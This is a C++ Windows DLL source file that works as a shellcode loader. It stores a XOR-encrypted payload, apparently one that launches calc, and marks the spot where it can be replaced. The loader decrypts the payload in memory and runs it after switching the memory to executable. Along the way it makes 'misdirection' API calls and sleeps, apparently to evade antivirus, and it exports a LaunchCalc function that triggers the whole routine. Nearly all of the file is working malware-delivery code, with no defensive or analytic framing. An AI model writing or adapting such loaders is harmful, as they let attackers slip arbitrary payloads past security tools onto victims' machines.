#include <windows.h>

// NEW ENCRYPTED SHELLCODE C+P HERE
unsigned char calc_shellcode[] = {
0x8E, 0xFC, 0x92, 0x8D, 0x88, 0xFA, 0x95, 0xB4, 0xBE, 0xF7, 0xA8, 0xBD, 0xBF, 0xC1, 0xA3,
0x8A, 0x87, 0xE5, 0x43, 0x32, 0xF6, 0xC8, 0x88, 0x55, 0xEC, 0xE5, 0x4B, 0xA8, 0xC6, 0xE5,
0x4B, 0xA8, 0xCE, 0xE5, 0x6D, 0x96, 0x55, 0x9D, 0x88, 0x55, 0xA0, 0x9D, 0xC3, 0x89, 0xE2,
0x26, 0x9C, 0xC9, 0xF6, 0x26, 0xB4, 0xC1, 0xFE, 0xE5, 0xC1, 0x20, 0x55, 0xF9, 0xDF, 0xFA,
0xD1, 0x1A, 0xEC, 0xC9, 0x53, 0xFF, 0xC2, 0x73, 0x5F, 0x91, 0xC7, 0x89, 0xB7, 0xC3, 0x85,
0xAB, 0x31, 0x26, 0xB4, 0xC1, 0xC2, 0xE5, 0xC1, 0x20, 0x55, 0x99, 0x6E, 0x96, 0xDF, 0x5A,
0x59, 0x21, 0x09, 0xE5, 0x43, 0x1A, 0xEE, 0xF0, 0x9F, 0x80, 0x85, 0xF7, 0x99, 0x86, 0x1D,
};


BOOL ExecuteShellcode() {
	DWORD oldProtect = 0;

    // Define the XOR key used for encryption
    unsigned char xor_key[] = { 0xDE, 0xAD, 0xC0, 0xDE };
    size_t key_len = sizeof(xor_key);


    void* exec_memory = VirtualAlloc(NULL, sizeof(calc_shellcode),
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);

    if (exec_memory == NULL) {
        return FALSE;
    }

	// we copy ENCRYPTED shellcode into memory
    memcpy(exec_memory, calc_shellcode, sizeof(calc_shellcode));

    // Misdirection: Call some common, low-impact APIs
    DWORD tickCount = GetTickCount();
    SYSTEMTIME sysTime;
    GetSystemTime(&sysTime);

    // Delay: Pause execution for a short period
    Sleep(2000); // Sleep for 2 seconds (Adjust as needed)


    // NOW, we DECRYPT the shellcode in the allocated buffer
    unsigned char* p_mem = (unsigned char*)exec_memory;
    for (size_t i = 0; i < sizeof(calc_shellcode); ++i) {
       p_mem[i] = p_mem[i] ^ xor_key[i % key_len]; // XOR each byte
    }


    // Change memory protection to RX before execution
    if (!VirtualProtect(exec_memory, sizeof(calc_shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
        // Handle VirtualProtect error (e.g., print GetLastError())
        VirtualFree(exec_memory, 0, MEM_RELEASE); // Clean up allocated memory
        return FALSE;
    }

    void (*shellcode_func)() = (void(*)())exec_memory;

    shellcode_func();

    // (Optional but Recommended) Restore original permissions before freeing
    DWORD dummyProtect; // We don't care about the 'old' protection on this call
    VirtualProtect(exec_memory, sizeof(calc_shellcode), oldProtect, &dummyProtect);

    VirtualFree(exec_memory, 0, MEM_RELEASE);
    return TRUE;
}

extern "C" {
    __declspec(dllexport) BOOL LaunchCalc() {
        return ExecuteShellcode();
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}